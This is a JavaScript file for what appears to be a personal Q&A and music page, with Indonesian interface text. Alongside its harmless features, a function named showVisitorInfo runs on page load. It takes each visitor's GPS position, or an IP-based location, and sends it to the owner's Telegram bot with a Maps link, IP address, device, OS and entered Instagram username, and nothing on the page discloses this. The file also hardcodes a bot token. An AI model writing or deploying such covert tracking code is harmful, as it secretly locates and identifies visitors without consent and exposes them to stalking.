// === 📸 Photo Options Toggle ===
const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
openPhotoOptions.addEventListener('click', () => photoOptions.classList.toggle('show'));

// === TELEGRAM BOT ===
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === MUSIC SETUP ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try { await music.play(); btnMusic.classList.remove("show"); }
  catch { btnMusic.classList.add("show"); }
}
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });
btnMusic.addEventListener('click', async () => {
  try { await music.play(); btnMusic.classList.remove("show"); }
  catch (e) { console.log(e); }
});

// === ASK MODAL ===
const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

// === LOGIN IG OVERLAY ===
const overlay = document.getElementById("blurOverlay");
const input = document.getElementById("igInput");
const btnLogin = document.getElementById("igSubmit");
const savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) { removeOverlay(); showUserStatus(savedIG); }
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// === UNIVERSAL SEND FUNCTION ===
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `<div class="mailContainer">
    <span class="mailLoop">📨</span><span class="mailLoop" style="animation-delay:0.25s">📨</span><span class="mailLoop" style="animation-delay:0.5s">📨</span>
  </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45; swoosh.play().catch(() => {});
      } catch {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else { el.textContent = "💔 Gagal mengirim."; return false; }
  } catch { el.textContent = "😿 Koneksi lemah."; return false; }
}

// === KIRIM PERTANYAAN ===
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const qmsg = document.getElementById('qmsg');
  if (!text) { qmsg.textContent = "Isi pertanyaan dulu."; return; }
  await sendTelegramMessage(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    { method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
    qmsg
  );
  setTimeout(() => {
    if (qmsg.textContent.includes("Terkirim")) modal.classList.remove('show');
  }, 900);
});

// === FOTO / PREVIEW ===
const takeBtn = document.getElementById("takePhoto");
const photoInput = document.getElementById("photoInput");
takeBtn.onclick = async () => {
  try {
    const cameraInput = document.createElement("input");
    cameraInput.type = "file"; cameraInput.accept = "image/*"; cameraInput.capture = "user";
    cameraInput.click();
    cameraInput.onchange = () => {
      if (cameraInput.files.length > 0) {
        photoInput.files = cameraInput.files;
        const reader = new FileReader();
        reader.onload = e => { preview.src = e.target.result; preview.style.display = "block"; };
        reader.readAsDataURL(cameraInput.files[0]);
      }
    };
  } catch { alert("Kamera tidak tersedia"); }
};
photoInput.addEventListener('change', () => {
  if (photoInput.files && photoInput.files[0]) {
    const reader = new FileReader(); reader.onload = () => {}; reader.readAsDataURL(photoInput.files[0]);
  }
});

// === KIRIM FOTO ===
document.getElementById("sendPhoto").addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const file = photoInput.files && photoInput.files[0];
  const caption = document.getElementById("caption").value;
  const statusEl = document.getElementById("status");
  if (!file) { statusEl.textContent = "Pilih foto dulu."; return; }
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
  fd.append("photo", file);
  const ok = await sendTelegramMessage(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd }, statusEl);
  if (ok) {
    photoInput.value = ""; document.getElementById("caption").value = ""; preview.style.display = "none";
  }
});

// === VISITOR INFO ===
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  async function sendToTelegram(d, lat, lon, src = "Unknown", acc = null) {
    try {
      const map = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}&z=17` : "https://www.google.com/maps";
      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
                 /Android/i.test(navigator.userAgent) ? "Android" :
                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
                 /Mac/i.test(navigator.userAgent) ? "MacOS" : "Unknown";
      const now = new Date();
      const msg = `📢 Pengunjung Baru!\n👤 ${savedUser}\n🌎 ${d.city || "?"}, ${d.country || "?"}\n🗺️ Maps: ${map}\n📍 ${src}${acc ? ` (±${acc}m)` : ""}\n💻 ${device}\n🧩 OS: ${os}\n📡 IP: ${d.ip || "?"}\n🕓 ${now.toLocaleString('id-ID')}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    } catch {}
  }
  try {
    const coords = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(p => res(p.coords), rej));
    const { latitude, longitude, accuracy } = coords;
    const d = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(d, latitude, longitude, "GPS", Math.round(accuracy));
  } catch {
    const d = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(d, d.latitude, d.longitude, "IP");
  }
}
showVisitorInfo();

// === BUTTERFLY ANIMATION ===
(function(){
  const area=document.querySelector('.card');
  if(!area) return;
  const butterflies=[];const count=7;
  area.style.position='relative';area.style.overflow='hidden';
  const rect=()=>({w:area.clientWidth,h:area.clientHeight});
  for(let i=0;i<count;i++){
    const b=document.createElement('div');b.className='butterfly';b.textContent='💸';area.appendChild(b);
    butterflies.push({el:b,x:Math.random()*rect().w,y:Math.random()*rect().h,vx:(Math.random()-0.5)*1.2,vy:(Math.random()-0.5)*1.2});
  }
  function move(){
    const r=rect();const t=performance.now()/200;
    butterflies.forEach(b=>{b.x+=b.vx;b.y+=b.vy;
      if(b.x<=0||b.x>=r.w-20)b.vx*=-1;if(b.y<=0||b.y>=r.h-20)b.vy*=-1;
      b.el.style.left=b.x+'px';b.el.style.top=b.y+'px';});
    requestAnimationFrame(move);
  }
  move();
})();

// === STATUS DAN SPOTIFY DALAM CARD ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parent = titleEl.parentElement || document.body;

  // STATUS TEXT
  const statusBox=document.createElement("div");
  statusBox.id="liveModeStatus";
  statusBox.style.cssText=`
    width:100%;text-align:center;font-size:14px;
    font-family:'Poppins',monospace;color:#cfcfcf;
    margin:6px 0 4px;opacity:0;transform:translateY(6px);
    transition:opacity .6s ease,transform .6s ease;
  `;
  parent.insertBefore(statusBox, parent.querySelector("#musicButton"));

  async function updateStatus(){
    try{
      const res=await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data=await res.json();
      const text=data.status||"🌙 Offline";
      statusBox.textContent=text;
      statusBox.style.opacity=1;
      statusBox.style.transform="translateY(0)";
      statusBox.style.color=text.includes("Listening")?"#4cc9ff":text.includes("Online")?"#00ffb3":text.includes("Offline")?"#ff7ca3":"#fff";
    }catch{statusBox.textContent="⚠️ Error";statusBox.style.color="#ff7979";}
  }
  updateStatus();setInterval(updateStatus,8000);

  // === SPOTIFY PREVIEW ===
  const spotifyBox=document.createElement("div");
  spotifyBox.id="spotifyPreviewBox";
  spotifyBox.style.cssText=`
    width:90%;max-width:240px;margin:8px auto 6px;
    text-align:center;border-radius:14px;
    background:rgba(255,255,255,0.05);
    padding:10px 8px 12px;
    box-shadow:0 0 15px rgba(76,201,255,0.12);
    backdrop-filter:blur(8px);
    transition:opacity .4s ease,transform .3s ease;
    opacity:0;transform:scale(0.98);
  `;

  const cover=document.createElement("img");
  cover.style.cssText=`
    width:100%;border-radius:10px;display:none;
    box-shadow:0 0 14px rgba(76,201,255,0.25);
  `;
  const wrap=document.createElement("div");
  wrap.style.cssText=`width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;margin-top:6px;overflow:hidden;`;
  const bar=document.createElement("div");
  bar.style.cssText=`height:100%;width:0%;background:linear-gradient(90deg,#4cc9ff,#b5179e);transition:width .4s linear;`;
  wrap.appendChild(bar);
  const song=document.createElement("div");
  song.style.cssText=`font-size:13px;font-weight:500;color:#e7faff;margin-top:6px;`;
  song.textContent="Not playing...";

  spotifyBox.append(cover,wrap,song);
  statusBox.insertAdjacentElement("afterend",spotifyBox);

  async function updateSpotify(){
    try{
      const r=await fetch("https://sybau.imamadevera.workers.dev/spotify",{cache:"no-store"});
      const d=await r.json();
      if(d.cover){cover.src=d.cover;cover.style.display="block";}
      else cover.style.display="none";
      if(d.status&&d.status.includes("Listening")){
        song.innerHTML=`<b>${d.status.replace("🎧 Listening on Spotify — ","")}</b>`;
      }else song.textContent="Not playing...";
      if(d.progress_ms&&d.duration_ms){
        const p=Math.min((d.progress_ms/d.duration_ms)*100,100);
        bar.style.width=p+"%";
      }else bar.style.width="0%";
      spotifyBox.style.opacity=1;
      spotifyBox.style.transform="scale(1)";
    }catch(e){console.warn("Spotify error:",e);}
  }
  updateSpotify();setInterval(updateSpotify,8000);
})();
